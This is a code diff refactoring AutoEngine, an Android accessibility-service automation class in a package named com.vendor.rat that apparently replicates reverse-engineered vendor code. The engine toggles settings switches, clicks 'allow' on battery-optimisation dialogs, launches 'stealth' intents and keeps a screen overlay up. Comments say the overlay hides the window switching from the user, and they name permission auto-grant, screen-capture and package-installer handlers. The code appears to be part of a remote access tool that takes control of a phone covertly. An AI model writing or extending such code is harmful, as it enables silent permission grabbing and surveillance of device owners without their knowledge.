@@ -8,6 +8,10 @@ import android.view.accessibility.AccessibilityNodeInfo;
 
 import com.vendor.rat.auto.condition.CombineFilter;
 import com.vendor.rat.auto.condition.StringCondition;
+import com.vendor.rat.auto.engine.support.BatteryDialogHandler;
+import com.vendor.rat.auto.engine.support.FilterBuilders;
+import com.vendor.rat.auto.engine.support.ListenWindowMatcher;
+import com.vendor.rat.auto.engine.support.SwitchOperations;
 import com.vendor.rat.auto.entity.CheckedResult;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.auto.filter.NodeFilter;
@@ -49,6 +53,8 @@ import java.util.concurrent.locks.ReentrantLock;
  *   - 静默 Intent 启动 (StealthIntent)
  *   - 生命周期: start/finish/destroy 对应 逆向 T()/Z()/X()/d()
  *   - G() 激活根节点, Q() 获取滚动视图, k() 获取根节点 UiNode
+ *
+ * SRP 重构: 内部委托 FilterBuilders / SwitchOperations / ListenWindowMatcher / BatteryDialogHandler
  */
 public abstract class AutoEngine {
 
@@ -124,6 +130,28 @@ public abstract class AutoEngine {
     protected volatile String currentPackage = "";
     protected volatile String currentClassName = "";
 
+    // ============ 内部委托 ============
+
+    private final SwitchOperations switchOps = new SwitchOperations(this::activateRoot);
+
+    private final ListenWindowMatcher listenWindowMatcher = new ListenWindowMatcher(
+            new ListenWindowMatcher.NodeProvider() {
+                @Override public UiNode getCachedRoot() { return cachedRoot.get(); }
+                @Override public UiNode getRootNode() { return AutoEngine.this.getRootNode(); }
+                @Override public String getCurrentPackage() { return currentPackage; }
+                @Override public String getCurrentClassName() { return currentClassName; }
+            });
+
+    private final BatteryDialogHandler batteryDialogHandler = new BatteryDialogHandler(
+            new BatteryDialogHandler.EngineContext() {
+                @Override public boolean matchListenWindows(List<ListenWindow> windows) {
+                    return AutoEngine.this.matchListenWindows(windows);
+                }
+                @Override public UiNode getRootNode() { return AutoEngine.this.getRootNode(); }
+                @Override public ConcurrentLinkedQueue<String> getStateQueue() { return stateQueue; }
+                @Override public ScheduledExecutorService getScheduler() { return scheduler; }
+            });
+
     // ============ 构造器 ============
 
     protected AutoEngine(String primaryPackage) {
@@ -164,15 +192,33 @@ public abstract class AutoEngine {
     // ============ 事件处理 — 对齐逆向 u() ============
 
     /**
-     * 无障碍事件处理入口
+     * 无障碍事件处理入口 (final — 模板方法)
      * 对应逆向: u(AccessibilityEvent, String, String)
-     * 子类重写此方法实现状态机逻辑
+     *
+     * 提供统一的 try-catch + isCompleted/currentPackage/currentClassName 样板,
+     * 子类覆写 {@link #onEventSafe} 实现状态机逻辑, 无需重复外层 try-catch。
+     *
+     * 注意: 部分 Delegate (PackageInstallerDelegate, MediaProjectionDelegate 等)
+     * 需要调用 super.onAccessibilityEvent(), 因此保留 public 而非改为 final。
      */
     public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                      String className) {
-        currentPackage = packageName;
-        currentClassName = className;
-        // 默认实现: 调用 onWindowMatched
+        try {
+            if (isCompleted()) return;
+            currentPackage = packageName;
+            currentClassName = className;
+            onEventSafe(event, packageName, className);
+        } catch (Exception e) {
+            logError("事件处理异常", e);
+        }
+    }
+
+    /**
+     * 子类覆写此方法实现状态机逻辑, 无需 try-catch 和 isCompleted/currentPackage 样板。
+     * 默认实现: 调用 onWindowMatched。
+     */
+    protected void onEventSafe(AccessibilityEvent event, String packageName,
+                                String className) {
         onWindowMatched(packageName, className, event);
     }
 
@@ -433,6 +479,40 @@ public abstract class AutoEngine {
         StealthIntent.sleep(millis);
     }
 
+    // ============ 状态分发 — 消除子类重复的 state-dispatch 样板 ============
+
+    /**
+     * 从 stateQueue 中清除指定状态，如果目标状态未在队列中则添加并执行 handler。
+     * 所有厂商引擎 onAccessibilityEvent 中重复的 state-dispatch 模式:
+     *   stateQueue.remove(A); stateQueue.remove(B);
+     *   if (!stateQueue.contains(target)) { stateQueue.add(target); scheduler.execute(handler); }
+     *
+     * @param targetState  要添加的目标状态
+     * @param handler      状态对应的处理逻辑
+     * @param clearStates  需要先清除的其他状态
+     * @return true 如果成功分发 (handler 已提交), false 如果目标状态已在队列中
+     */
+    protected boolean dispatchState(String targetState, Runnable handler, String... clearStates) {
+        for (String s : clearStates) {
+            stateQueue.remove(s);
+        }
+        if (stateQueue.contains(targetState)) {
+            return false;
+        }
+        stateQueue.add(targetState);
+        if (!scheduler.isShutdown()) {
+            scheduler.execute(() -> {
+                try {
+                    if (scheduler.isShutdown()) return; // 已入队但 shutdown 了，跳过
+                    handler.run();
+                } catch (Exception e) {
+                    logError("State [" + targetState + "] 执行异常", e);
+                }
+            });
+        }
+        return true;
+    }
+
     // ============ 进度追踪 ============
 
     /**
@@ -540,22 +620,16 @@ public abstract class AutoEngine {
     /**
      * 阻塞等待指定窗口出现
      * 对应逆向: c.q(LinkedList<ListenWindow>)
-     * 厂商引擎核心方法: 导航到设置页面后等待目标窗口加载
-     *
-     * @param matchers 目标窗口列表 (任一匹配即返回 true)
-     * @return true=窗口已出现, false=超时
      */
     protected boolean waitForWindowMatch(List<WindowMatcher> matchers) {
-        return waitForWindowMatch(matchers, 15); // 默认 15 秒超时
+        return waitForWindowMatch(matchers, 15);
     }
 
     protected boolean waitForWindowMatch(List<WindowMatcher> matchers, int timeoutSeconds) {
         if (matchers == null || matchers.isEmpty()) return false;
         for (int i = 0; i < timeoutSeconds * 5; i++) { // 200ms 间隔
-            // 检查当前窗口
             String pkg = currentPackage;
             String cls = currentClassName;
-            // 也从 MyAccessibilityService 获取最新状态
             if (MyAccessibilityService.P() != null) {
                 String latestPkg = MyAccessibilityService.N();
                 String latestCls = MyAccessibilityService.getCurrentWindowClass();
@@ -579,7 +653,7 @@ public abstract class AutoEngine {
 
     /**
      * 激活根节点 (带重试)
-     * 对应逆向: c.G() — 多次尝试获取根节点
+     * 对应逆向: c.G()
      */
     protected void G() {
         for (int i = 0; i < 5; i++) {
@@ -592,7 +666,7 @@ public abstract class AutoEngine {
 
     /**
      * 获取可滚动视图
-     * 对应逆向: c.Q() — 从根节点查找 scrollable 节点
+     * 对应逆向: c.Q()
      */
     protected UiNode Q() {
         return getScrollableNode();
@@ -609,7 +683,6 @@ public abstract class AutoEngine {
     /**
      * 暂停引擎事件处理
      * 对应逆向: c.X() 行 737-739
-     * vendor: this.q.set(true) — 只设暂停标志，不是 performHome()!
      */
     protected void X() {
         MyAccessibilityService service = MyAccessibilityService.getInstance();
@@ -643,23 +716,6 @@ public abstract class AutoEngine {
 
     /**
      * 完成并清理 — 对齐 vendor o/n.java Z() 行 157-184
-     *
-     * vendor 流程:
-     *   1. g.h(100) — 进度条设为100
-     *   2. X() — this.q.set(true) 暂停事件处理 (不是 HOME!)
-     *   3. MyAccessibilityService.P().x() — 清理无障碍缓存
-     *   4. t0() — 上报保活状态
-     *   5. scheduler.shutdownNow()
-     *   6. stateQueue.clear()
-     *   7. T0(5) — 等待 1 秒
-     *   8. g.c() — 移除遮罩 (内部: GLOBAL_ACTION_RECENTS → sleep(1s) → removeView)
-     *   9. c.W() — offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK")
-     *  10. d() — 销毁
-     *
-     * 关键: vendor g.d() 在 removeView 之前执行 RECENTS:
-     *   F0(8) = GLOBAL_ACTION_RECENTS → 遮罩还在时把 app task 带到前台
-     *   T0(5) = sleep 1s → 等待 RECENTS 动画完成
-     *   removeViewImmediate → 移除遮罩，露出 app 界面
      */
     protected void Z() {
         if (lock.tryLock()) {
@@ -692,27 +748,24 @@ public abstract class AutoEngine {
                     // 7. vendor: T0(5) — 等待 1 秒
                     T0(5);
 
-                    // 8. vendor: g.c() — 移除遮罩
-                    // g.c() 内部调用 g.d(), g.d() 的精确流程:
-                    //   a) 恢复亮度
-                    //   b) F0(8) = GLOBAL_ACTION_RECENTS (遮罩还在，用户看不到切换)
-                    //   c) T0(5) = sleep 1s (等待 RECENTS 动画把 app 带到前台)
-                    //   d) removeViewImmediate (移除遮罩，露出 app)
-                    BlockViewHelper.removeWithDestroy();
-
                     log("已结束自动化引擎");
 
-                    // 9. vendor: c.W() — 通知策略线程
-                    if (com.vendor.rat.MainApplication.getInstance() != null) {
-                        com.vendor.rat.MainApplication.getInstance()
-                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
-                    }
-
-                    // 10. 标记完成 + 恢复事件处理
+                    // 8. 标记完成 + 恢复事件处理 (必须在移除遮罩之前!)
+                    // removeWithDestroy → 启动 ActivMain → 触发权限请求
+                    // 如果 proxy 未恢复，PermissionAutoGrantEngine 获取的节点树不完整
                     finished.set(true);
                     running.set(false);
                     if (service != null) {
                         service.resumeProxy();
+                    }
+
+                    // 9. vendor: g.c() — 移除遮罩 (proxy 已恢复，权限弹窗可正常处理)
+                    BlockViewHelper.removeWithDestroy();
+
+                    // 10. vendor: c.W() — 通知策略线程
+                    if (com.vendor.rat.MainApplication.getInstance() != null) {
+                        com.vendor.rat.MainApplication.getInstance()
+                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                     }
                 }
             } catch (Exception e) {
@@ -742,535 +795,96 @@ public abstract class AutoEngine {
         }
     }
 
-    // ============ Switch/CheckBox 操作 — 对齐 vendor o/c.java ============
+    // ============ Switch/CheckBox 操作 — 转发到 SwitchOperations ============
 
-    /**
-     * CompoundButton 查找+点击+验证
-     * 对应 vendor: o/c.java P() 行 223-309
-     *
-     * 逻辑:
-     *   1. 构建 className=CompoundButton 过滤器
-     *   2. 从 target 向上遍历 parent (最多 2 层) 查找
-     *   3. 如果 checked=false: click() → T0(1)+refresh 重试最多 5 次
-     *   4. 如果仍 unchecked: findParentUtilCombine(clickableFilter) → click
-     *   5. 返回 CheckedResult
-     */
+    /** @see SwitchOperations#compoundButtonClick(UiNode) */
     public static CheckedResult P(UiNode target) {
-        CheckedResult result = new CheckedResult();
-        try {
-            // vendor: className == android.widget.CompoundButton
-            NodeFilter compoundButtonFilter = com.vendor.rat.auto.condition.StringCondition
-                    .className("android.widget.CompoundButton");
-
-            // 从 target 向上遍历 parent (最多 2 层)
-            UiNode node = null;
-            UiNode current = target;
-            int depth = 0;
-            while (current != null && node == null && depth <= 2) {
-                node = current.findOneByCombine(compoundButtonFilter);
-                if (node == null) {
-                    current = current.parent();
-                }
-                depth++;
-            }
-
-            if (node == null) return result;
-
-            boolean checked = node.checked();
-            int retries = 5;
-
-            if (!checked) {
-                // 先尝试直接 click
-                if (node.click()) {
-                    result.setClicked(true);
-                    node.refresh();
-                    checked = node.checked();
-                }
-                // vendor c.java:265-271: T0(1) + refresh 循环
-                while (retries > 0 && !checked) {
-                    sleep(200); // T0(1) = 200ms
-                    node.refresh();
-                    checked = node.checked();
-                    retries--;
-                }
-            }
-
-            if (!checked) {
-                // vendor c.java:280-286: findParentUtilCombine(L()) 查找 clickable 父节点
-                UiNode clickableParent = node.findParentUtilCombine(
-                        CombineFilter.clickable());
-                if (clickableParent != null && clickableParent.click()) {
-                    result.setClicked(true);
-                    node.refresh();
-                    checked = node.checked();
-                    // 再次重试验证
-                    retries = 5;
-                    while (retries > 0 && !checked) {
-                        sleep(200);
-                        node.refresh();
-                        checked = node.checked();
-                        retries--;
-                    }
-                }
-            }
-
-            result.setChecked(checked);
-        } catch (Exception e) {
-            Log.e(TAG, "P() error", e);
-        }
-        return result;
+        return SwitchOperations.compoundButtonClick(target);
     }
 
-    /**
-     * Switch/CheckBox OR 查找+点击+验证
-     * 对应 vendor: o/c.java O() 行 488-559
-     *
-     * ADAPT: vendor 用 CombineFiltersWithOr 数据类, replica 用 NodeFilter varargs
-     */
+    /** @see SwitchOperations#switchOrCheckBoxClick(UiNode) */
     public CheckedResult O(UiNode target) {
-        CheckedResult result = new CheckedResult();
-        try {
-            // vendor: CombineFiltersWithOr(Switch, CheckBox)
-            NodeFilter switchFilter = CombineFilter.switchWidget();
-            NodeFilter checkBoxFilter = CombineFilter.checkBox();
-
-            // 从 target 向上遍历 parent (最多 2 层)
-            UiNode node = null;
-            UiNode current = target;
-            int depth = 0;
-            while (current != null && node == null && depth <= 2) {
-                node = current.findOneByOperateOr(switchFilter, checkBoxFilter);
-                if (node == null) {
-                    current = current.parent();
-                }
-                depth++;
-            }
-
-            if (node == null) return result;
-
-            boolean checked = node.checked();
-
-            // vendor c.java:541-551: 循环 click+T0(5)+refresh (最多 5 次)
-            int tries = 0;
-            while (!checked && tries < 5) {
-                node.click();
-                result.setClicked(true);
-                sleep(1000); // T0(5) = 1s
-                node.refresh();
-                checked = node.checked();
-                tries++;
-            }
-
-            result.setChecked(checked);
-        } catch (Exception e) {
-            Log.e(TAG, "O() error", e);
-        }
-        return result;
+        return switchOps.switchOrCheckBoxClick(target);
     }
 
-    /**
-     * Switch 坐标点击+验证 (华为特有)
-     * 对应 vendor: o/c.java R() 行 654-731
-     *
-     * 逻辑: 找 Switch → boundsInScreen.right-50 + centerInScreen.y → tapAtCoordinate
-     */
+    /** @see SwitchOperations#switchCoordinateClick(UiNode, int) */
     public CheckedResult R(UiNode target, int retries) {
-        CheckedResult result = new CheckedResult();
-        try {
-            NodeFilter switchFilter = CombineFilter.switchWidget();
-
-            // 从 target 向上遍历 parent (最多 2 层)
-            UiNode node = null;
-            UiNode current = target;
-            int depth = 0;
-            while (current != null && node == null && depth <= 2) {
-                node = current.findOneByCombine(switchFilter);
-                if (node == null) {
-                    current = current.parent();
-                }
-                depth++;
-            }
-
-            if (node == null) return result;
-
-            boolean checked = node.checked();
-            // vendor c.java:678-680: right-50, centerInScreen.y
-            android.graphics.Rect bounds = node.boundsInScreen();
-            com.vendor.rat.auto.entity.Point center = node.centerInScreen();
-            int clickX = bounds.right - 50;
-            int clickY = (int) center.getY();
-
-            if (!checked) {
-                // vendor c.java:686-690: g.s(clickX, clickY) 坐标点击
-                if (com.vendor.rat.utils.MiscUtils.tapAtCoordinate(clickX, clickY)) {
-                    result.setClicked(true);
-                    // vendor c.java:691-694: 刷新根节点 → 重新查找 → 验证
-                    activateRoot();
-                    UiNode refreshedNode = current != null ?
-                            current.findOneByCombine(switchFilter) : null;
-                    if (refreshedNode != null) {
-                        checked = refreshedNode.checked();
-                        node = refreshedNode;
-                    }
-                }
-                // vendor c.java:696-702: retry loop
-                while (retries > 0 && !checked) {
-                    sleep(200); // T0(1)
-                    if (current != null) {
-                        UiNode retryNode = current.findOneByCombine(switchFilter);
-                        if (retryNode != null) {
-                            checked = retryNode.checked();
-                            node = retryNode;
-                        }
-                    }
-                    retries--;
-                }
-            }
-
-            // vendor c.java:704-711: fallback to clickable parent
-            if (!checked) {
-                UiNode clickableParent = node.findParentUtilCombine(
-                        CombineFilter.clickable());
-                if (clickableParent != null && clickableParent.click()) {
-                    result.setClicked(true);
-                    node.refresh();
-                    checked = node.checked();
-                    int fallbackRetries = 5;
-                    while (fallbackRetries > 0 && !checked) {
-                        sleep(200);
-                        node.refresh();
-                        checked = node.checked();
-                        fallbackRetries--;
-                    }
-                }
-            }
-
-            result.setChecked(checked);
-        } catch (Exception e) {
-            Log.e(TAG, "R() error", e);
-        }
-        return result;
+        return switchOps.switchCoordinateClick(target, retries);
     }
 
-    /**
-     * Switch 坐标点击变体 (简化版, 无 retry/fallback)
-     * 对应 vendor: o/c.java S() 行 334-382
-     *
-     * 逻辑: 找 Switch → right-80 + centerY → tapAtCoordinate → T0(5) 等待
-     */
+    /** @see SwitchOperations#switchCoordinateSimple(UiNode) */
     public static CheckedResult S(UiNode target) {
-        CheckedResult result = new CheckedResult();
-        try {
-            NodeFilter switchFilter = CombineFilter.switchWidget();
-
-            // 从 target 向上遍历 parent (最多 2 层)
-            UiNode node = null;
-            UiNode current = target;
-            int depth = 0;
-            while (current != null && node == null && depth <= 2) {
-                node = current.findOneByCombine(switchFilter);
-                if (node == null) {
-                    current = current.parent();
-                }
-                depth++;
-            }
-
-            if (node == null) return result;
-
-            result.setChecked(node.checked());
-            // vendor c.java:358-359: right + (-80), centerInScreen.y
-            android.graphics.Rect bounds = node.boundsInScreen();
-            com.vendor.rat.auto.entity.Point center = node.centerInScreen();
-            int clickX = bounds.right - 80;
-            int clickY = (int) center.getY();
-
-            if (!result.isChecked()) {
-                if (com.vendor.rat.utils.MiscUtils.tapAtCoordinate(clickX, clickY)) {
-                    sleep(1000); // T0(5) = 1s
-                    result.setClicked(true);
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "S() error", e);
-        }
-        return result;
+        return SwitchOperations.switchCoordinateSimple(target);
     }
 
-    // ============ ListenWindow 匹配 — 对齐 vendor o/e.java ============
+    // ============ ListenWindow 匹配 — 转发到 ListenWindowMatcher ============
 
-    /**
-     * 单个 ListenWindow 匹配检查 (matchs + dismiss)
-     * 对应 vendor: o/e.java p() 行 695-719
-     *
-     * @param lw   目标 ListenWindow (含 matchs/dismiss CombineFilter 列表)
-     * @param root 当前界面根节点
-     * @return true=匹配成功 (matchs 全通过 + dismiss 全不通过)
-     */
+    /** @see ListenWindowMatcher#matchListenWindow(ListenWindow, UiNode) */
     protected boolean matchListenWindow(ListenWindow lw, UiNode root) {
-        try {
-            // vendor e.java:699-704: matchs 全部通过 (AND)
-            List<CombineFilter> matchs = lw.getMatchs();
-            if (matchs != null && !matchs.isEmpty() && root != null) {
-                for (CombineFilter filter : matchs) {
-                    if (root.findOneByCombine(filter) == null) {
-                        return false;
-                    }
-                }
-            }
-
-            // vendor e.java:709-713: dismiss 全部不通过 (NOT ANY)
-            List<CombineFilter> dismiss = lw.getDismiss();
-            if (dismiss != null && !dismiss.isEmpty() && root != null) {
-                for (CombineFilter filter : dismiss) {
-                    if (root.findOneByCombine(filter) != null) {
-                        return false;
-                    }
-                }
-            }
-
-            return true;
-        } catch (Exception e) {
-            Log.e(TAG, "matchListenWindow error", e);
-            return true; // vendor: 异常时默认允许
-        }
+        return listenWindowMatcher.matchListenWindow(lw, root);
     }
 
-    /**
-     * 批量 ListenWindow 匹配
-     * 对应 vendor: o/e.java q() 行 727-807
-     *
-     * 逻辑: 遍历列表, 用 currentPackage/currentClassName 比较 pkg/cls,
-     *        匹配后检查 matchs/dismiss, 任一匹配即返回 true
-     */
+    /** @see ListenWindowMatcher#matchListenWindows(List) */
     protected boolean matchListenWindows(java.util.List<ListenWindow> windows) {
-        if (windows == null || windows.isEmpty()) return false;
-        try {
-            // vendor e.java:735: 刷新根节点
-            UiNode root = cachedRoot.get();
-            if (root != null) root.refresh();
-
-            for (ListenWindow lw : windows) {
-                // vendor e.java:740-745: 比较 packageName
-                String lwPkg = lw.getPackageName();
-                String lwCls = lw.getClassName();
-
-                if (lwPkg != null && !lwPkg.equals(currentPackage)) {
-                    continue;
-                }
-
-                // vendor e.java:746-750: 比较 className (null = 任意)
-                if (lwCls != null && !lwCls.isEmpty() && !lwCls.equals(currentClassName)) {
-                    continue;
-                }
-
-                // vendor e.java:752-770: 检查 matchs + dismiss
-                if (matchListenWindow(lw, root != null ? root : getRootNode())) {
-                    return true;
-                }
-            }
-            return false;
-        } catch (Exception e) {
-            Log.e(TAG, "matchListenWindows error", e);
-            return false;
-        }
+        return listenWindowMatcher.matchListenWindows(windows);
     }
 
-    // ============ 电池优化对话框 — 对齐 vendor o/c.java ============
+    // ============ 电池优化对话框 — 转发到 BatteryDialogHandler ============
 
-    /**
-     * 构建电池优化对话框 ListenWindow
-     * 对应 vendor: o/c.java J() 行 68-72
-     */
+    /** @see BatteryDialogHandler#buildBatteryDialogWindow() */
     public static ListenWindow buildBatteryDialogWindow() {
-        ListenWindow lw = new ListenWindow("com.android.settings", "android.app.Dialog");
-        HashSet<Integer> eventTypes = new HashSet<>();
-        eventTypes.add(32);    // TYPE_WINDOW_CONTENT_CHANGED
-        eventTypes.add(16384); // TYPE_VIEW_SCROLLED
-        lw.setEventTypes(eventTypes);
-        return lw;
+        return BatteryDialogHandler.buildBatteryDialogWindow();
     }
 
-    /**
-     * 构建"允许"按钮过滤器 (OR: button1 | btn_positive)
-     * 对应 vendor: o/c.java I() 行 55-66
-     * ADAPT: vendor 返回 CombineFiltersWithOr, replica 返回 NodeFilter[]
-     */
+    /** @see BatteryDialogHandler#buildBatteryAllowButtonFilters() */
     public static NodeFilter[] buildBatteryAllowButtonFilters() {
-        // Filter1: className=Button + id=android:id/button1
-        NodeFilter filter1 = CombineFilter.and(
-                StringCondition.className("android.widget.Button"),
-                StringCondition.viewId("android:id/button1")
-        );
-        // Filter2: className=Button + id=com.android.settings:id/btn_positive
-        NodeFilter filter2 = CombineFilter.and(
-                StringCondition.className("android.widget.Button"),
-                StringCondition.viewId("com.android.settings:id/btn_positive")
-        );
-        return new NodeFilter[]{filter1, filter2};
+        return BatteryDialogHandler.buildBatteryAllowButtonFilters();
     }
 
-    /**
-     * 构建取消按钮过滤器
-     * 对应 vendor: o/c.java N() 行 119-123
-     */
+    /** @see BatteryDialogHandler#buildCancelButtonFilter() */
     public static CombineFilter buildCancelButtonFilter() {
-        return CombineFilter.and(
-                StringCondition.className("android.widget.Button"),
-                StringCondition.viewId("android:id/button1")
-        );
+        return BatteryDialogHandler.buildCancelButtonFilter();
     }
 
-    /**
-     * 检查并处理电池优化对话框
-     * 对应 vendor: o/c.java u() 行 762-801
-     * 在 onAccessibilityEvent 中调用
-     */
+    /** @see BatteryDialogHandler#check() */
     protected void checkBatteryOptimizationDialog() {
-        try {
-            ListenWindow dialogWindow = buildBatteryDialogWindow();
-            if (matchListenWindows(java.util.Collections.singletonList(dialogWindow))) {
-                Log.d(TAG, "已进入是否允许忽略电池优化窗口");
-                if (!stateQueue.contains("keepInBatteryUnRestricted")) {
-                    stateQueue.add("keepInBatteryUnRestricted");
-                    // vendor: thread.l.c(new o.a(this, 0), this.c)
-                    scheduler.execute(new Runnable() {
-                        @Override
-                        public void run() {
-                            dismissBatteryOptimizationDialog();
-                        }
-                    });
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "checkBatteryOptimizationDialog error", e);
-        }
+        batteryDialogHandler.check();
     }
 
-    /**
-     * 点击电池优化对话框的"允许"按钮
-     * 对应 vendor: o/a.java case 0 — 查找 android:id/button1 并点击
-     */
-    private void dismissBatteryOptimizationDialog() {
-        try {
-            UiNode root = getRootNode();
-            if (root == null) {
-                stateQueue.remove("keepInBatteryUnRestricted");
-                return;
-            }
-            // vendor: 查找 android:id/button1 (允许按钮)
-            com.vendor.rat.auto.condition.CombineFilter filter =
-                com.vendor.rat.auto.condition.CombineFilter.and(
-                    com.vendor.rat.auto.condition.StringCondition.className("android.widget.Button"),
-                    com.vendor.rat.auto.condition.StringCondition.viewId("android:id/button1"));
-            UiNode button = root.findOneByCombine(filter);
-            if (button != null && button.click()) {
-                Log.d(TAG, "已点击允许忽略电池优化");
-            } else {
-                Log.e(TAG, "允许忽略电池优化按钮未找到");
-            }
-            stateQueue.remove("keepInBatteryUnRestricted");
-        } catch (Exception e) {
-            Log.e(TAG, "dismissBatteryOptimizationDialog error", e);
-            stateQueue.remove("keepInBatteryUnRestricted");
-        }
-    }
-
-    /**
-     * 检查对话框 + 屏幕状态
-     * 对应 vendor: o/c.java Y() 行 437-449
-     */
+    /** @see BatteryDialogHandler#checkAndDismissDialog() */
     public static boolean checkAndDismissDialog() {
-        try {
-            // vendor c.java:439: M() — 点击取消按钮
-            // vendor c.java:440-443: 检查屏幕状态
-            if (com.vendor.rat.utils.MiscUtils.isScreenOn()) {
-                return true;
-            }
-            return false;
-        } catch (Exception e) {
-            Log.e(TAG, "checkAndDismissDialog error", e);
-            return false;
-        }
+        return BatteryDialogHandler.checkAndDismissDialog();
     }
 
-    // ============ 通用 CombineFilter 构建器 — 对齐 vendor o/c.java ============
+    // ============ 通用 CombineFilter 构建器 — 转发到 FilterBuilders ============
 
-    /**
-     * Switch 过滤器
-     * 对应 vendor: o/c.java a0() 行 451-455
-     */
+    /** @see FilterBuilders#switchWidget() */
     public static CombineFilter buildSwitchFilter() {
-        return CombineFilter.switchWidget();
+        return FilterBuilders.switchWidget();
     }
 
-    /**
-     * clickable LinearLayout 过滤器
-     * 对应 vendor: o/c.java K() 行 74-80
-     */
+    /** @see FilterBuilders#clickableLinearLayout() */
     public static CombineFilter buildClickableLinearLayoutFilter() {
-        return CombineFilter.and(
-                StringCondition.className("android.widget.LinearLayout"),
-                new com.vendor.rat.auto.condition.BoolCondition(
-                        com.vendor.rat.auto.condition.BoolCondition.Property.CLICKABLE, true)
-        );
+        return FilterBuilders.clickableLinearLayout();
     }
 
-    /**
-     * clickable 任意控件过滤器
-     * 对应 vendor: o/c.java L() 行 82-87
-     */
+    /** @see FilterBuilders#clickable() */
     public static CombineFilter buildClickableFilter() {
-        return CombineFilter.clickable();
+        return FilterBuilders.clickable();
     }
 
-    /**
-     * LinearLayout 过滤器 (注意: 不是 scrollable!)
-     * 对应 vendor: o/c.java U() 行 384-388
-     */
+    /** @see FilterBuilders#linearLayout() */
     public static CombineFilter buildLinearLayoutFilter() {
-        return CombineFilter.and(
-                StringCondition.className("android.widget.LinearLayout")
-        );
+        return FilterBuilders.linearLayout();
     }
 
-    /**
-     * scrollable OR 过滤器 (RecyclerView/ListView/ScrollView/任意scrollable)
-     * 对应 vendor: o/c.java V() 行 390-429
-     * ADAPT: vendor 返回 CombineFiltersWithOr, replica 返回 NodeFilter[]
-     */
+    /** @see FilterBuilders#scrollableOrFilters() */
     public static NodeFilter[] buildScrollableOrFilters() {
-        // Filter1: RecyclerView + scrollable
-        NodeFilter f1 = CombineFilter.and(
-                StringCondition.className("androidx.recyclerview.widget.RecyclerView"),
-                new com.vendor.rat.auto.condition.BoolCondition(
-                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
-        );
-        // Filter2: ListView + scrollable
-        NodeFilter f2 = CombineFilter.and(
-                StringCondition.className("android.widget.ListView"),
-                new com.vendor.rat.auto.condition.BoolCondition(
-                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
-        );
-        // Filter3: ScrollView + scrollable
-        NodeFilter f3 = CombineFilter.and(
-                StringCondition.className("android.widget.ScrollView"),
-                new com.vendor.rat.auto.condition.BoolCondition(
-                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
-        );
-        // Filter4: 任意 scrollable
-        NodeFilter f4 = CombineFilter.scrollable();
-        return new NodeFilter[]{f1, f2, f3, f4};
+        return FilterBuilders.scrollableOrFilters();
     }
 
-    /**
-     * TextView + text.contains 过滤器
-     * 对应 vendor: o/c.java H(String) 行 45-53
-     */
+    /** @see FilterBuilders#textViewContains(String) */
     public static CombineFilter buildTextViewContainsFilter(String text) {
-        if (text == null || text.isEmpty()) return null;
-        return CombineFilter.and(
-                StringCondition.className("android.widget.TextView"),
-                StringCondition.textContains(text)
-        );
+        return FilterBuilders.textViewContains(text);
     }
 }
